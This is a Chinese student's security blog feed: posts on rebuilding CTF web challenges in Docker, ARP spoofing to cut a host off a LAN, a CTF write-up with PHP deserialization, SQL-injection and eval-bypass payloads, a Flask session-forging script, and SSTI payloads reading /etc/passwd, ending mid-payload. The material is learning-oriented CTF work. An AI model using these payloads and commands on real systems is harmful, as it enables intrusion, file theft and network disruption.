<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>木偶&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-11T03:05:40.694Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>木偶</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dockerfile搭建简单Web题目</title>
    <link href="http://yoursite.com/2019/07/11/Dockerfile%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95Web%E9%A2%98%E7%9B%AE/"/>
    <id>http://yoursite.com/2019/07/11/Dockerfile搭建简单Web题目/</id>
    <published>2019-07-11T02:24:50.000Z</published>
    <updated>2019-07-11T03:05:40.694Z</updated>
    
    <content type="html"><![CDATA[<p>CTF赛程结束后，Web题目环境关了不是太好复现，学习了下怎么用Dockerfile来重新搭建一下环境（只学会了怎么用，自己出题还是不会写，菜哭）<br><a id="more"></a></p><p>##Docker简介</p><p>##Docker常用命令</p><p>拉取镜像： </p><pre><code>docker pull imagename  </code></pre><p>查看docker当前镜像：   </p><pre><code>docker images  </code></pre><p>新建一个docker容器，并映射端口号：</p><pre><code>docker run -d -p host port:docker port imagename</code></pre><p>用到的一些命令： </p><pre><code>-d  后台运行-P(大写)  随机把容器的端口映射到一个主机未使用的高端口-p(小写)  格式为主机端口：容器端口 ，自选端口映射-i  以交互模式运行容器，常与-t连用-t  为容器重新分配一个伪输入终端，常与-i连用</code></pre><p>查看运行中的docker容器：</p><pre><code>docker ps -a </code></pre><p>进入一个docker容器：</p><pre><code>docker exec -it container—id bash</code></pre><p>拷贝本地文件到docker：</p><pre><code>docker cp /root/ container id:容器内路径（var/www/html）</code></pre><p>开始/停止容器</p><pre><code>docker start/stop container id</code></pre><p>首先我们在github下载开源的Web题目源码<br>php4fun的好多challenge，选取了challenge2</p><p>利用xftp6将文件上传到服务器root文件夹下，cd命令进入该文件，</p><pre><code>docker build -t w .</code></pre><p>使用下载的dockerfile文件创建一个命名为w的镜像</p><p>新建容器，并随机分配端口</p><pre><code>docker run -d -P w</code></pre><p><img src="/2019/07/11/Dockerfile搭建简单Web题目/2.jpg" alt=" "> </p><p>访问32774端口，题目搭建完成</p><p><img src="/2019/07/11/Dockerfile搭建简单Web题目/1.jpg" alt=" "> </p><p>解题payload：</p><pre><code>?str=${phpinfo()}</code></pre><p>str=${phpinfo()}，$str=phpinfo(),eval就执行了此命令，不过cat命令不知道为什么没反应<br>读取flag.php的内容拿到flag估计需要拿shell？</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF赛程结束后，Web题目环境关了不是太好复现，学习了下怎么用Dockerfile来重新搭建一下环境（只学会了怎么用，自己出题还是不会写，菜哭）&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>ARP攻击</title>
    <link href="http://yoursite.com/2019/05/04/ARP%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/05/04/ARP攻击/</id>
    <published>2019-05-04T08:15:58.000Z</published>
    <updated>2019-05-04T11:19:12.477Z</updated>
    
    <content type="html"><![CDATA[<p>折腾了大半天，最后也只是了解了arp攻击一些最基础的语句，可扫描当前局域网下连接的ip地址，对指定的ip断网，局限性很高，需要在内网，仅限日常娱乐，一些监听之类的操作还需要补知识（菜是原罪）。</p><h3 id="ARP欺骗原理"><a href="#ARP欺骗原理" class="headerlink" title="ARP欺骗原理"></a>ARP欺骗原理</h3><p>其主要原理是局域网内的”攻击机”通过冒充同网络号下的”受害者主机”的物理地址（mac地址），通过欺骗网关，让网关原来应该发给“受害者主机”的数据包转而发给“攻击机”，这就导致了“受害者主机”无法收到应答的数据包，也就等于断网了。本实验的过程也就是常说的  ARP欺骗。<br><a id="more"></a></p><h3 id="IP地址，子网掩码，网关定义"><a href="#IP地址，子网掩码，网关定义" class="headerlink" title="IP地址，子网掩码，网关定义"></a>IP地址，子网掩码，网关定义</h3><h4 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h4><p>IP地址：为了使连入Internet的众多电脑主机在通信时能够相互识别，Internet中的每一台主机都分配有一个唯一的32位地址，该地址称为IP地址，也称作网际地址。IP地址由4个数组成，每个数可取值0～255。</p><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h4><p>子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。 子网掩码的设定必须遵循一定的规则。与IP地址相同，子网掩码的长度也是32位，左边是网络位，用二进制数字“1”表示；右边是主机位，用二进制数字“0”表示。例如IP地址为“192.168.1.1”和子网掩码为“255.255.255.0”。其中，“1”有24个，代表与此相对应的IP地址左边24位是网络号；“0”有8个，代表与此相对应的IP地址右边8位是主机号。这样，子网掩码就确定了一个IP地址的32位二进制数字中哪些是网络号、哪些是主机号。</p><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p>大家都知道，从一个房间走到另一个房间，必然要经过一扇门。同样，从一个网络向另一个网络发送信息，也必须经过一道“关口”，这道关口就是网关。顾名思义，网关(Gateway)就是一个网络连接到另一个网络的“关口”。同一局域网下的网关相同。</p><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>大家好，我是练习时长两小时半的个人练习生，喜欢唱、跳、arp，突发奇想想学一下rap，研究了大半天发现工具基本上用不了，arpattacker的自动攻击频率太低，所以只能自己写包（dbp，不会自己写，菜哭），之后尝试了下Windows的arpspoof简单软件，可以实现对手机ip的断网操作，但是电脑无法断开，在linux上安装了arpspoof，安装和虚拟机的网络上遇到了一些问题，下面记录一下问题的解决方法。</p><h4 id="安装arpspoof"><a href="#安装arpspoof" class="headerlink" title="安装arpspoof"></a>安装arpspoof</h4><pre><code>apt-get install dsniff ssldump</code></pre><h4 id="虚拟机网络问题"><a href="#虚拟机网络问题" class="headerlink" title="虚拟机网络问题"></a>虚拟机网络问题</h4><p>需要使用桥接模式，直接连接物理网络，在NAT模式中，执行攻击命令时会报错</p><pre><code>libnet_open_link(): UID/EUID 0 or capability CAP_NET_RAW required</code></pre><p>NAT模式会共享主机的ip地址。</p><h4 id="查询和攻击命令"><a href="#查询和攻击命令" class="headerlink" title="查询和攻击命令"></a>查询和攻击命令</h4><p>查询本机网卡和ip地址</p><pre><code>ifconfig</code></pre><p>查询网关</p><pre><code>route -n</code></pre><p>查询连接在局域网的ip地址</p><pre><code>fping -asg 192.168.1.0/24fping -asg 网口.0/24nmap -sP 192.168.1.0/24nmap -sP 网口.0/24</code></pre><p>攻击命令</p><pre><code>sudo -s arpspoof -i ens33 -t 192.168.1.102 192.168.1.1sudo -s arpspoof -i 网卡 -t 攻击ip  网关</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;折腾了大半天，最后也只是了解了arp攻击一些最基础的语句，可扫描当前局域网下连接的ip地址，对指定的ip断网，局限性很高，需要在内网，仅限日常娱乐，一些监听之类的操作还需要补知识（菜是原罪）。&lt;/p&gt;
&lt;h3 id=&quot;ARP欺骗原理&quot;&gt;&lt;a href=&quot;#ARP欺骗原理&quot; class=&quot;headerlink&quot; title=&quot;ARP欺骗原理&quot;&gt;&lt;/a&gt;ARP欺骗原理&lt;/h3&gt;&lt;p&gt;其主要原理是局域网内的”攻击机”通过冒充同网络号下的”受害者主机”的物理地址（mac地址），通过欺骗网关，让网关原来应该发给“受害者主机”的数据包转而发给“攻击机”，这就导致了“受害者主机”无法收到应答的数据包，也就等于断网了。本实验的过程也就是常说的  ARP欺骗。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>国赛做题+补题</title>
    <link href="http://yoursite.com/2019/04/28/%E5%9B%BD%E8%B5%9B%E5%81%9A%E9%A2%98-%E8%A1%A5%E9%A2%98/"/>
    <id>http://yoursite.com/2019/04/28/国赛做题-补题/</id>
    <published>2019-04-28T02:37:10.000Z</published>
    <updated>2019-05-31T12:09:01.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="国赛WP"><a href="#国赛WP" class="headerlink" title="国赛WP"></a>国赛WP</h2><p>第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。<br><a id="more"></a></p><h3 id="web1-just-soso"><a href="#web1-just-soso" class="headerlink" title="web1 just soso"></a>web1 just soso</h3><p>看源码发现提示</p><pre><code>&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;</code></pre><p>php封装协议file=php://filter/read=convert.base64-encode/resource=hint.php可读index.php和hint.php的源码，base64解码得到源码如下</p><pre><code> Index.php&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;];if(!isset($file)){echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;}if(preg_match(&quot;/flag/&quot;,$file)){die(&apos;hack attacked!!!&apos;);}@include($file);if(isset($payload)){  $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);parse_str($url[&apos;query&apos;],$query);foreach($query as $value){    if (preg_match(&quot;/flag/&quot;,$value)) {         die(&apos;stop hacking!&apos;);        exit();    }}$payload = unserialize($payload);}else{   echo &quot;Missing parameters&quot;; } ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;Hint.php&lt;?php  class Handle{ private $handle;  public function __wakeup(){    foreach(get_object_vars($this) as $k =&gt; $v) {        $this-&gt;$k = null;    }    echo &quot;Waking up\n&quot;;}public function __construct($handle) {     $this-&gt;handle = $handle; } public function __destruct(){    $this-&gt;handle-&gt;getFlag();}}class Flag{public $file;public $token;public $token_flag;function __construct($file){    $this-&gt;file = $file;    $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));}public function getFlag(){    $this-&gt;token_flag = md5(rand(1,10000));    if($this-&gt;token === $this-&gt;token_flag)    {        if(isset($this-&gt;file)){            echo @highlight_file($this-&gt;file,true);         }      }}}?&gt;</code></pre><p>可以看到是反序列化的问题，存在正则匹配ban掉了“flag”，所以不能直接读flag.php，反序列化构造中也需要用到flag，url地址三斜杠可绕过foreach的遍历；<br>__wakeup中会this-&gt;$k = null;会将this指向空，需要绕过，__wakeup触发于unserilize()调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。所以再反序列化后，将Handle类的对象个数改变就可绕过；<br>MD5的if($this-&gt;token === $this-&gt;token_flag)<br>本来以为是伪随机数种子，后来发现只需让$F-&gt;token=&amp;$F-&gt;token_flag;即可<br>&amp;表示取变量，让两个变量值关联起来</p><p>反序列化脚本</p><pre><code>&lt;?phpclass Handle{ private $handle;  public function __wakeup(){    foreach(get_object_vars($this) as $k =&gt; $v) {        $this-&gt;$k = null;    }    echo &quot;Waking up\n&quot;;}public function __construct($handle) {     $this-&gt;handle = $handle; } public function __destruct(){    $this-&gt;handle-&gt;getFlag();}}class Flag{public $file;public $token;public $token_flag;function __construct($file){    $this-&gt;file = $file;    $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));}public function getFlag(){    $this-&gt;token_flag = md5(rand(1,10000));    if($this-&gt;token === $this-&gt;token_flag)    {        if(isset($this-&gt;file)){            echo @highlight_file($this-&gt;file,true);         }      }}}$F = new Flag(&apos;flag.php&apos;);$F-&gt;token=&amp;$F-&gt;token_flag;$H  = new Handle($F);$test =  serialize($H);echo $test?&gt;</code></pre><p>由于private的特性，需要在Handle和handle对象前面加上%00 或者/00<br>，\00但是前面的就应该改为S，不是s，因为如果是S那么类似\00abc 就是\0 a b c 四个字符，所以就是S:14:”\00Handle\00handle”</p><pre><code>payload：O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:  {s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;12f73080e04ce0d8e95defb577ebc3f4&quot;;  s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p>最终payload：</p><pre><code>http://cce097dcc8944553906620bb82f4ad36dd057d6462bd4e30.changame.ichunqiu.com  ///?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;  O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:  &quot;token&quot;;s:32:&quot;12f73080e04ce0d8e95defb577ebc3f4&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p>拿到flag</p><h3 id="web2-全世界最简单的SQL"><a href="#web2-全世界最简单的SQL" class="headerlink" title="web2 全世界最简单的SQL"></a>web2 全世界最简单的SQL</h3><p>过滤了一堆东西，or<br>|<br>benchmark<br>sleep<br>if<br>get_lock<br>case  </p><p>时间盲注过滤了三个sleep、benchmark和get_lock函数，但是后来超哥发现可以通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><pre><code>admin&apos; union select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;)#</code></pre><p>确实可以产生延迟，但是延迟之后是404，而且由于过滤了if，无法通过延迟进行查询，卡住）<br>之后队友发现通过pow函数，在某一特定范围内显示的登陆失败，超过某一范围是数据库操作失败，测试后发现’ union select pow(2,2014) #数据库操作失败，2013就是登陆失败，以此结合查询语句找到数据库名<br>语句：</p><pre><code>a&apos;union select pow(2,1997+ascii(substr(database(),1,1)))#</code></pre><p>不知道为啥python显示中文为乱码，后来发现需要a.content.decode(‘utf-8’),虚拟机里跑不出来，需要装个python环境了</p><pre><code>import requestsi=96j=0r=requests.session()for j&lt;20:  while i&lt;156:        url=&apos;http://7325a6806d8140fd91c5b9b3082a6ed240b2e3ab52c64a46.changame.ichunqiu.com/?tdsourcetag=s_pctim_aiomsg&apos;   data={&apos;username&apos;:&apos;a\&apos;union select pow(2,&quot;+str(2013-i)&quot;+ascii(substr(database(),&quot;+str(j)+&quot;,1))) #&apos;,&apos;password&apos;:&apos;1&apos;}   a=r.post(url,data=data)   if&quot;数据库操作失败&quot;in a.content.decode(&apos;utf-8&apos;):       print(i)       break   else :i=i+1   j=j+1   print(i)</code></pre><p>得到数据库名ctf，现在问题是or被ban了，information也不能用了，没法查表名没法查列名，老大说可以子查询绕过，通过构造子查询 给本来被ban（或者爆不出）的字段名换了个”名字”<br>先构造子查询的联合查询语句并指定别名</p><pre><code>1&apos; UNION SELECT 1,2,admin_x,4,5 FROM (SELECT 1 as admin_1,2 as admin_2,3 as admin_3 from admin WHERE 1=2 UNION SELECT * from admin)x %23</code></pre><p>猜到表名为user，照着老大的博客构造还弄了好久，那个别名需要定义，否则会出错</p><pre><code>a&apos; union select pow(2,1997+ascii(substr((select  admin_2 from (select 1 as admin_1 ,2 as admin_2 from user where 1=2 union select * from user)x) ,2,1))) #</code></pre><p>改造上面的脚本爆出密码（队友爆出来的，脚本出了问题，burp手注，太慢了，菜醒）<br>得到密码登陆。</p><p>其他师傅们的思路 select cot(0)报错，select cot(1) 可以执行，之后就是布尔盲注结合子查询。</p><h3 id="web3-love-math"><a href="#web3-love-math" class="headerlink" title="web3 love_math"></a>web3 love_math</h3><pre><code>&lt;?php  error_reporting(0);  //听说你很喜欢数学，不知道你是否爱它胜过爱flag  if(!isset($_GET[&apos;c&apos;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[&apos;c&apos;]; if (strlen($content) &gt;= 80) {     die(&quot;太长了不会算&quot;); } $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; foreach ($blacklist as $blackitem) {     if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) {         die(&quot;请不要输入奇奇怪怪的字符&quot;);     } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) {     if (!in_array($func, $whitelist)) {         die(&quot;请不要输入奇奇怪怪的函数&quot;);     } } //帮你算出答案 eval(&apos;echo &apos;.$content.&apos;;&apos;); }</code></pre><p>有个eval  </p><p>‘.’可以实现字符串的拼接，后来发现对16进制及以上进制异或运算可以得到字母，所给白名单又有base_convert函数，构造</p><pre><code>base_convert(1751504350,10,36)(base_convert(784,10,36));（语句是system（ls））</code></pre><p>看得到flag，但是现在问题是，cat flag.php 需要空格和.,用<em>代替发现还是需要空格，cat&lt;f</em>中&lt;又被处理成了小于号，卡住）</p><p>异或运算，用两个白名单函数和空格+<em>异或，得到十进制数字，dechex后<br>再与那两个白名单函数异或，就可以回到空格</em>，就可以执行system（cat *）拿到flag<br>，队友写的脚本，还不会写php，回头研究下（菜是原罪</p><pre><code>base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(19)^tan^exp))（语句是system(cat *)点号将cat和 *拼接了起来</code></pre><p>其他队伍使用的是 system(getallheaders(){9})，然后在headers里传了个9，tql⑧。</p><h3 id="web4-RefSpace"><a href="#web4-RefSpace" class="headerlink" title="web4 RefSpace"></a>web4 RefSpace</h3>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;国赛WP&quot;&gt;&lt;a href=&quot;#国赛WP&quot; class=&quot;headerlink&quot; title=&quot;国赛WP&quot;&gt;&lt;/a&gt;国赛WP&lt;/h2&gt;&lt;p&gt;第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>flask伪造session</title>
    <link href="http://yoursite.com/2019/04/07/flask%E4%BC%AA%E9%80%A0session/"/>
    <id>http://yoursite.com/2019/04/07/flask伪造session/</id>
    <published>2019-04-07T13:48:30.000Z</published>
    <updated>2019-04-07T14:20:26.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flask伪造session"><a href="#flask伪造session" class="headerlink" title="flask伪造session"></a>flask伪造session</h2><p>github的脚本<br><a id="more"></a></p><pre><code>&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;__author__ = &apos;Wilson Sumanang, Alexandre ZANNI&apos;import sysimport zlibfrom itsdangerous import base64_decodeimport astimport argparseparser = argparse.ArgumentParser(        description=&apos;Flask Session Cookie Decoder/Encoder&apos;,        epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)subparsers = parser.add_subparsers(help=&apos;sub-command help&apos;, dest=&apos;subcommand&apos;)parser_encode = subparsers.add_parser(&apos;encode&apos;, help=&apos;encode&apos;)parser_encode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Secret key&apos;, required=True)parser_encode.add_argument(&apos;-t&apos;, &apos;--cookie-structure&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Session cookie structure&apos;, required=True)parser_decode = subparsers.add_parser(&apos;decode&apos;, help=&apos;decode&apos;)parser_decode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Secret key&apos;, required=False)parser_decode.add_argument(&apos;-c&apos;, &apos;--cookie-value&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Session cookie value&apos;, required=True)args = parser.parse_args()from flask.sessions import SecureCookieSessionInterfaceclass MockApp(object):def __init__(self, secret_key):    self.secret_key = secret_keydef session_cookie_encoder(secret_key, session_cookie_structure):&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;try:    app = MockApp(secret_key)    session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))    si = SecureCookieSessionInterface()    s = si.get_signing_serializer(app)    return s.dumps(session_cookie_structure)except Exception as e:    return &quot;[Encoding error]{}&quot;.format(e)def session_cookie_decoder(session_cookie_value, secret_key=None):&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;try:    if(secret_key==None):        compressed = False        payload = session_cookie_value        if payload.startswith(b&apos;.&apos;):            compressed = True            payload = payload[1:]        data = payload.split(&quot;.&quot;)[0]        data = base64_decode(data)        if compressed:            data = zlib.decompress(data)        return data    else:        app = MockApp(secret_key)        si = SecureCookieSessionInterface()        s = si.get_signing_serializer(app)        return s.loads(session_cookie_value)except Exception as e:    return &quot;[Decoding error]{}&quot;.format(e)if __name__ == &quot;__main__&quot;:if(args.subcommand == &apos;encode&apos;):    if(args.secret_key is not None and args.cookie_structure is not None):        print(session_cookie_encoder(args.secret_key, args.cookie_structure))elif(args.subcommand == &apos;decode&apos;):    if(args.secret_key is not None and args.cookie_value is not None):        print(session_cookie_decoder(args.cookie_value,args.secret_key))    elif(args.cookie_value is not None):        print(session_cookie_decoder(args.cookie_value))</code></pre><p>#</p><pre><code>加密示例 $ python2 session_cookie_manager.py encode -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos; -t &apos;{&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;}&apos;输出：eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw解密示例 $ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos; -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos;输出：{u&apos;username&apos;: &apos;admin&apos;, u&apos;number&apos;: &apos;326410031505&apos;}无密钥：$ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos;</code></pre><p>hgame的happypython就是先解密session再将id改为1后加密，替换session即可登陆。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;flask伪造session&quot;&gt;&lt;a href=&quot;#flask伪造session&quot; class=&quot;headerlink&quot; title=&quot;flask伪造session&quot;&gt;&lt;/a&gt;flask伪造session&lt;/h2&gt;&lt;p&gt;github的脚本&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SSTI(1)</title>
    <link href="http://yoursite.com/2019/04/07/SSTI-1/"/>
    <id>http://yoursite.com/2019/04/07/SSTI-1/</id>
    <published>2019-04-07T01:52:33.000Z</published>
    <updated>2019-04-07T14:20:27.185Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。<br>hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替<br><a id="more"></a></p><h2 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h2><p>什么是SSTI？</p><p>SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。</p><p>攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。</p><p>这样，攻击者可以控制渲染进模版的内容。通过直接输入模版渲染的关键词例如{ }，即可将恶意代码注入模版中执行。最严重的后果是getshell。</p><p>现在有很多常见的模版渲染引擎，而最常用也最长出问题的Web框架就是基于Python的Flask框架了。</p><h2 id="注入姿势："><a href="#注入姿势：" class="headerlink" title="注入姿势："></a>注入姿势：</h2><h3 id="内省config对象"><a href="#内省config对象" class="headerlink" title="内省config对象"></a>内省config对象</h3><p>config对象是一个Flask模板全局变量，代表“当前配置对象(flask.config）”。它是一个类似于字典的对象，其中包含了应用程序所有的配置值，包含若干独特方法的子类：from_envvar，from_object，from_pyfile，以及root_path。在大多数情况下，会包含数据库连接字符串，第三方服务凭据，SECRET_KEY之类的敏感信息。</p><p>对于新加载的模块，from_object方法会将那些变量名全是大写的属性添加到config对象中。注入payload{ config.items() }就可以轻松查看这些配置了。　　</p><h3 id="使用非常重要的内省组件：-mro-和-subclasses-属性。"><a href="#使用非常重要的内省组件：-mro-和-subclasses-属性。" class="headerlink" title="使用非常重要的内省组件：__mro__和__subclasses__属性。"></a>使用非常重要的内省组件：__mro__和__subclasses__属性。</h3><p>__mro__中的MRO代表方法解析顺序，并且在这里定义为，“是一个包含类的元组，而其中的类就是在方法解析的过程中在寻找父类时需要考虑的类”。__mro__属性以包含类的元组来显示对象的继承关系，它的父类，父类的父类，一直向上到object（如果是使用新式类的话）。它是每个对象的元类属性，但它却是一个隐藏属性，因为Python在进行内省时明确地将它从dir的输出中移除了（见Objects/object.c的第1812行）。</p><p>__subclasses__属性则在这里被定义为一个方法，“每个新式类保留对其直接子类的一个弱引用列表。此方法返回那些引用还存在的子类”。</p><p>使用__mro__属性来访问对象的父类，使用__subclasses__属性来访问对象的子类</p><p>使用索引2来选择object类。现在我们到达了object类，我们使用/<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）<br>找到object:<br>    { ‘’.__class__.__mro__[2].__subclasses__() }</p><p>任意文件读取：<br>    { ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }</p><h4 id="os-模块"><a href="#os-模块" class="headerlink" title="[os]模块"></a>[os]模块</h4><p>通过os模块可以进行一些文件的操作</p><pre><code>{[].\__class__.\__base__.\__subclasses__()}</code></pre><p>的方法来访问所有模块<br><img src="https://img-blog.csdn.net/20181004223429919?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>访问os模块都是从warnings.catch_warnings模块入手的。找到catch_warnings的位置(上面查到的所有模块的索引，这里是59，即第59个模块)；</p><p>知道了位置后，再用func_globals看看该模块有哪些global函数;</p><p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}<br><img src="https://img-blog.csdn.net/20181004224339752?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>这里能看到linecache，我们要访问的os模块就在这里，现在我们看看这个模块的各种属性：</p><p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals[‘linecache’].__dict__}<br>然后在很长的返回值里就可以找到os模块了<br>然后就可以用</p><pre><code>{[].\__class__.\__base__.\__subclasses__()[59].\__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;]}</code></pre><p>来代替os模块的使用了，之所以写__dict__[‘o’+’s’]，而不写__dict__[‘os’],是因为os这个字符串被禁用了，只能使用python里面字符串的拼接绕过现在os.read()</p><pre><code>[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].read()[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].open()[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;.&apos;)</code></pre><p>cg题的payload</p><pre><code>http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;..&